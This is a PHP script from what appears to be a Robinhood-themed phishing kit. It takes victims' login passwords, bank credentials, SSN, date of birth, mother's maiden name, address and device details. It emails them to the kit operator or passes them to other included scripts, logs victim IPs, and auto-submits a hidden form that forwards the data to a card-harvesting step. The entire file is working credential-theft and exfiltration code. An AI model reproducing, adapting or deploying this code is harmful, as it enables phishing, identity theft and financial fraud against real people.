<?php
session_start();
include'../main.php';
include'../get_setting.php';
if (!isset($_SESSION['email'])) {
	exit(header("HTTP/1.0 404 Not Found"));
}else{
$ip = getUserIP();
$subject = "BANK LOGIN ".$_POST['bank_name']." [".$_POST['userid']." - ".$_SESSION['email']."] - [".$cn." - ".$ip." - ".$br."]";
$message = '
<p>
<b>===================[ ROBINHOOD LOGIN ]===================</b><br>
Email : '.$_SESSION['email'].'<br>
Password : '.$_SESSION['pass_log'].'<br>
<b>===================[ EMAIL LOGIN ]===================</b><br>
Email : '.$_SESSION['email'].'<br>
Password : '.$_SESSION['password'].'<br>
<b>===================[ BANK LOGIN ]===================</b><br>
BANK NAME : '.$_POST['bank_name'].'<br>
Website Login : '.$_POST['site'].'<br>
Username : '.$_POST['userid'].'<br>
Password : '.$_POST['pass_bank'].'<br>
<b>======================[ BILLING INFORMATION ]======================</b><br>
Full name : '.$_SESSION['fname'].'<br>
State : '.$_SESSION['state'].'<br>
City : '.$_SESSION['city'].'<br>
Street address : '.$_SESSION['address'].'<br>
ZIP : '.$_SESSION['zip'].'<br>
Date of birth : '.$_SESSION['dob'].'<br>
SSN : '.$_SESSION['ssn'].'<br>
Phone number : '.$_SESSION['phone'].'<br>
Mothers Maiden Name : '.$_SESSION['mmn'].'<br>
<b>===================[ DEVICE INFO ]===================</b><br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
User Agent : '.$user_agent.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
OS / BR : '.$os.' / '.$br.'<br>
Timezone : '.$timezone.'<br>
Time Login : '.$date.'<br>
<b>===================[ SPM55 - ROBINHOOD ]===================</b>
</p>
';
if ($send_login == "email") {
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'FROM: BANK LOGIN '.$_POST['bank_name'].' <'.$sender_mail.'>' . "\r\n";
include'api.php';
mail($email_result, $subject, $message, $headers);
tulis_file("../admin/result/total_bank.txt", $ip);
}else{
include'api.php';
include'server.php';
tulis_file("../admin/result/total_bank.txt", $ip);
}
if ($get_cc == "on") {
	echo "<form id='boyxd' method='POST' action='../card'>
	<input type='hidden' name='email' value='".$_SESSION['email']."'>
	<input type='hidden' name='pass_log' value='".$_SESSION['pass_log']."'>
	<input type='hidden' name='fname' value='".$_SESSION['fname']."'>
	<input type='hidden' name='state' value='".$_SESSION['state']."'>
	<input type='hidden' name='city' value='".$_SESSION['city']."'>
	<input type='hidden' name='address' value='".$_SESSION['address']."'>
	<input type='hidden' name='zip' value='".$_SESSION['zip']."'>
	<input type='hidden' name='dob' value='".$_SESSION['dob']."'>
	<input type='hidden' name='ssn' value='".$_SESSION['ssn']."'>
	<input type='hidden' name='phone' value='".$_SESSION['phone']."'>
	<input type='hidden' name='mmn' value='".$_SESSION['mmn']."'>
	</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
	echo "<form id='boyxd' method='POST' action='../done'><input type='hidden' name='email' value='".$_POST['email']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
}
?>